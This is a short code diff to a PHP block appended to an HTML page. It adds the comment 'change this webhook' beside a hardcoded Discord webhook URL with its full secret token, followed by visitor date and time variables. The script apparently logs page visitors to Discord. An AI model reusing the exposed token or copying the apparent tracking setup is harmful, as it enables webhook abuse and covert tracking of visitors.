@@ -33,7 +33,7 @@ fjs.parentNode.insertBefore(js, fjs);
 </body>
 </html>
 <?php
-$webhookurl = "https://canary.discord.com/api/webhooks/827632985162907709/9lX8Ru3Csl-LS8DGqWr24GQa5-vJuo2YimV9Xs0sAXnRDAxmI8SCndyXMr8wess-va-h"; 
+$webhookurl = "https://canary.discord.com/api/webhooks/827632985162907709/9lX8Ru3Csl-LS8DGqWr24GQa5-vJuo2YimV9Xs0sAXnRDAxmI8SCndyXMr8wess-va-h";  //change this webhook
 $TheirDate = date('d/m/Y');
 $TheirTime = date('G:i:s');
 $timestamp = date("c", strtotime("now"));
